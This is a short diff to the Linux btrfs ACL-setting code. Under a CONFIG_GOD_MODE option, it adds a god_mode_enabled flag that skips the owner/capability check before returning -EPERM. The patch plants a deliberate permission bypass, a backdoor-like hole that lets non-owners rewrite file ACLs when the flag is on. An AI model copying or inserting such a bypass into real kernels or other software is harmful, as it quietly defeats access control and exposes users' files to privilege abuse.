@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * Copyright (C) 2007 Red Hat.  All rights reserved.
  *
@@ -163,7 +166,15 @@ static int btrfs_xattr_acl_set(struct dentry *dentry, const char *name,
 	struct posix_acl *acl = NULL;
 
 	if (!inode_owner_or_capable(dentry->d_inode))
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 
 	if (!IS_POSIXACL(dentry->d_inode))
 		return -EOPNOTSUPP;
